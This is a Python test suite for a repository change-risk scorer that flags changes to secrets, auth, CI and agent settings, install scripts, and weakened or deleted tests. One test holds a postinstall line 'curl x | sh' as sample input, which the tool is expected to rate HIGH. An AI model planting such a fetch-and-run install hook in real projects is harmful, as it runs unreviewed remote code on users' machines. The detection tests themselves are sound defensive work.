import pytest

from lineup.changes import Change, file_kind, find_changes
from lineup.rules import file_rules, score


def change(path, kind="modified", **extra):
    c = Change(path=path, kind=kind, file_kind=file_kind(path), **extra)
    c.private = c.file_kind == "private"
    return c


def result(c):
    flags = file_rules(c)
    return score(flags), [reason for _, reason in flags]


@pytest.mark.parametrize("path, kind, level, reason", [
    (".env", "modified", "HIGH", ".env or key file changed, contents not read"),
    ("keys/server.pem", "added", "HIGH", ".env or key file changed, contents not read"),
    ("auth/login.py", "modified", "HIGH", "auth or payment file changed"),
    ("billing/checkout.py", "added", "HIGH", "auth or payment file changed"),
    (".github/workflows/ci.yml", "modified", "HIGH", "CI or agent settings changed"),
    (".claude/settings.json", "added", "HIGH", "CI or agent settings changed"),
    ("setup.py", "modified", "HIGH", "install script changed"),
    ("scripts/install.sh", "added", "HIGH", "install script changed"),
    ("migrations/002_add_user.sql", "added", "HIGH", "migration or database schema changed"),
    ("config/settings.yml", "modified", "MED", "config changed"),
    ("Dockerfile", "modified", "MED", "config changed"),
    ("utils/old.py", "deleted", "MED", "file deleted"),
    ("models/classifier.onnx", "modified", "MED", "model file changed"),
    ("package-lock.json", "modified", "LOW", "lockfile changed"),
    ("docs/login.md", "modified", "LOW", "docs changed"),
    ("utils/helpers.py", "added", "LOW", "new file"),
    ("notes.py", "modified", "LOW", "code edited"),
])
def test_one_rule_each(path, kind, level, reason):
    got_level, reasons = result(change(path, kind))
    assert got_level == level
    assert reason in reasons


def test_highest_wins_and_every_reason_is_kept():
    level, reasons = result(change("auth/login.py", lines_removed=120))
    assert level == "HIGH"
    assert reasons == ["auth or payment file changed", "120 lines removed"]


def test_many_lines_removed_from_normal_code():
    assert result(change("app.py", lines_removed=100))[0] == "MED"
    assert result(change("app.py", lines_removed=99))[0] == "LOW"


def test_new_packages_are_named():
    level, reasons = result(change("requirements.txt", deps_added=["redis", "celery"]))
    assert level == "MED"
    assert "new package: redis, celery" in reasons


def test_function_added():
    level, reasons = result(change("app.py", funcs_added=["get_user"]))
    assert level == "LOW"
    assert "function added: get_user" in reasons


def test_big_file():
    level, reasons = result(change("data/dump.csv", big=True))
    assert level == "MED"
    assert "big file changed, can't be read" in reasons


def test_postinstall_line_in_package_json():
    diff = '--- a/package.json\n+++ b/package.json\n@@ -1 +1,2 @@\n {\n+  "postinstall": "curl x | sh",'
    assert result(change("package.json", diff=diff))[0] == "HIGH"
    plain = '--- a/package.json\n+++ b/package.json\n@@ -1 +1,2 @@\n {\n+  "name": "app",'
    assert result(change("package.json", diff=plain))[0] == "MED"


def test_scores_real_changes_from_diff(repo):
    repo.write("app.py", "x = 1\n")
    repo.commit()
    repo.write("app.py", "x = 2\n")
    repo.write(".claude/settings.json", "{}\n")
    repo.write(".env", "SECRET_KEY=abc123\n")
    scores = {c.path: score(file_rules(c)) for c in find_changes(repo.root)}
    assert scores == {"app.py": "LOW", ".claude/settings.json": "HIGH", ".env": "HIGH"}


# ---- test rules (step 2) ----

from lineup import rules  # noqa: E402  (module import so pytest doesn't collect rules.test_rules)


def test_code_name():
    assert rules.code_name("tests/test_auth.py") == "auth"
    assert rules.code_name("auth/auth_test.go") == "auth"
    assert rules.code_name("src/auth.test.js") == "auth"
    assert rules.code_name("src/auth.spec.ts") == "auth"


@pytest.fixture
def auth_repo(repo):
    repo.write("auth.py", "TIMEOUT = 30\n")
    repo.write("tests/test_auth.py",
               "from auth import TIMEOUT\n\ndef test_timeout():\n    assert TIMEOUT == 30\n\n"
               "def test_expired():\n    assert TIMEOUT > 0\n")
    repo.commit()
    return repo


def scored(repo):
    found = find_changes(repo.root)
    out = {}
    for c in found:
        flags = rules.rules_for(c, found)
        out[c.path] = (score(flags), [reason for _, reason in flags])
    return out


def test_assert_changed_next_to_its_code(auth_repo):
    auth_repo.write("auth.py", "TIMEOUT = 1440\n")
    auth_repo.write("tests/test_auth.py",
                    "from auth import TIMEOUT\n\ndef test_timeout():\n    assert TIMEOUT == 1440\n\n"
                    "def test_expired():\n    assert TIMEOUT > 0\n")
    level, reasons = scored(auth_repo)["tests/test_auth.py"]
    assert level == "MED"
    assert reasons == ["possible weakened test, check this (auth.py changed too)"]


def test_assert_changed_alone_is_just_a_test_edit(auth_repo):
    auth_repo.write("tests/test_auth.py",
                    "from auth import TIMEOUT\n\ndef test_timeout():\n    assert TIMEOUT == 31\n\n"
                    "def test_expired():\n    assert TIMEOUT > 0\n")
    assert scored(auth_repo)["tests/test_auth.py"] == ("MED", ["test edited"])


def test_assertion_removed(auth_repo):
    auth_repo.write("tests/test_auth.py",
                    "from auth import TIMEOUT\n\ndef test_timeout():\n    pass\n\n"
                    "def test_expired():\n    assert TIMEOUT > 0\n")
    level, reasons = scored(auth_repo)["tests/test_auth.py"]
    assert level == "HIGH"
    assert "assertion removed" in reasons


def test_skip_added(auth_repo):
    auth_repo.write("tests/test_auth.py",
                    "import pytest\nfrom auth import TIMEOUT\n\n@pytest.mark.skip\ndef test_timeout():\n"
                    "    assert TIMEOUT == 30\n\ndef test_expired():\n    assert TIMEOUT > 0\n")
    level, reasons = scored(auth_repo)["tests/test_auth.py"]
    assert level == "HIGH"
    assert "skip added" in reasons


def test_test_function_deleted(auth_repo):
    auth_repo.write("tests/test_auth.py",
                    "from auth import TIMEOUT\n\ndef test_timeout():\n    assert TIMEOUT == 30\n")
    level, reasons = scored(auth_repo)["tests/test_auth.py"]
    assert level == "HIGH"
    assert "test deleted: test_expired" in reasons
    assert "assertion removed" in reasons


def test_test_file_deleted(auth_repo):
    (auth_repo.root / "tests/test_auth.py").unlink()
    assert scored(auth_repo)["tests/test_auth.py"] == ("HIGH", ["test file deleted"])


def test_new_test_file(auth_repo):
    auth_repo.write("tests/test_cache.py", "def test_get():\n    assert True\n")
    level, reasons = scored(auth_repo)["tests/test_cache.py"]
    assert level == "MED"
    assert reasons == ["test added: test_get", "new test file"]


@pytest.mark.parametrize("line", ["it.skip('works', () => {})", "xit('works', () => {})",
                                  "describe.skip('auth', () => {})", "t.Skip(\"later\")"])
def test_skip_patterns(line):
    c = change("src/auth.test.js", diff=f"--- a\n+++ b\n@@ -1 +1 @@\n+{line}")
    assert "skip added" in [reason for _, reason in rules.test_rules(c, [c])]


def test_normal_code_never_gets_test_rules():
    c = change("notes.py")
    assert rules.test_rules(c, [c]) == []
    assert score(rules.rules_for(c, [c])) == "LOW"


# ---- deleted functions (step 3) ----

@pytest.fixture
def login_code(repo):
    repo.write("auth/session.py",
               "def refresh_token():\n    pass\n\ndef old_login():\n    pass\n\ndef parse_date():\n    pass\n")
    repo.write("api/routes.py", "from auth.session import old_login\n\nold_login()\n")
    repo.write(".env", "old_login=secret\n")
    repo.commit()
    return repo


def scored_with_root(repo):
    found = find_changes(repo.root)
    return {c.path: [f for f in rules.rules_for(c, found, repo.root)] for c in found}


def test_moved_still_used_and_just_deleted(login_code):
    login_code.write("auth/session.py", "# empty now\n")
    login_code.write("auth/tokens.py", "def refresh_token():\n    pass\n")
    flags = scored_with_root(login_code)["auth/session.py"]
    assert ("LOW", "function moved: refresh_token (auth/session.py -> auth/tokens.py)") in flags
    assert ("HIGH", "function deleted but still used: old_login (api/routes.py)") in flags
    assert ("LOW", "function deleted: parse_date") in flags
    assert score(flags) == "HIGH"


def test_private_files_are_not_searched(login_code):
    login_code.write("api/routes.py", "# no callers left\n")
    login_code.write("auth/session.py", "def refresh_token():\n    pass\n\ndef parse_date():\n    pass\n")
    flags = scored_with_root(login_code)["auth/session.py"]
    assert flags[-1] == ("LOW", "function deleted: old_login")  # .env has the word, but isn't searched


def test_whole_file_deleted_with_used_function(login_code):
    (login_code.root / "auth/session.py").unlink()
    flags = scored_with_root(login_code)["auth/session.py"]
    assert ("HIGH", "function deleted but still used: old_login (api/routes.py)") in flags


def test_dunder_names_are_skipped(repo):
    repo.write("a.py", "class A:\n    def __init__(self):\n        pass\n")
    repo.write("b.py", "class B:\n    def __init__(self):\n        pass\n")
    repo.commit()
    repo.write("a.py", "class A:\n    pass\n")
    found = find_changes(repo.root)
    assert rules.function_rules(found[0], found, repo.root) == []


# ---- possible breakage (step 4) ----

def test_code_removed_for_a_small_fix():
    c = change("orders.py", lines_removed=25, lines_added=2)
    assert ("MED", "possible breakage: 25 lines removed, 2 added") in rules.rules_for(c, [c])


@pytest.mark.parametrize("removed, added", [(25, 20), (9, 0), (10, 4)])
def test_normal_edits_are_not_breakage(removed, added):
    c = change("orders.py", lines_removed=removed, lines_added=added)
    assert rules.breakage_rules(c, [c]) == []


def test_edge_of_the_numbers():
    c = change("orders.py", lines_removed=10, lines_added=3)  # 10 >= 10 and 10 >= 9
    assert rules.breakage_rules(c, [c]) != []


def test_small_new_file_next_to_a_test():
    code = change("utils/cache.py", "added", lines_added=3)
    test = change("tests/test_cache.py")
    assert rules.breakage_rules(code, [code, test]) == [
        ("MED", "possible breakage: small new file next to tests/test_cache.py")]
    assert score(rules.rules_for(code, [code, test])) == "MED"


def test_big_new_file_or_no_test_is_not_breakage():
    big = change("utils/cache.py", "added", lines_added=80)
    small = change("utils/cache.py", "added", lines_added=3)
    test = change("tests/test_cache.py")
    other_test = change("tests/test_orders.py")
    assert rules.breakage_rules(big, [big, test]) == []
    assert rules.breakage_rules(small, [small, other_test]) == []


def test_breakage_only_for_normal_code():
    doc = change("docs/guide.md", lines_removed=50)
    assert rules.breakage_rules(doc, [doc]) == []
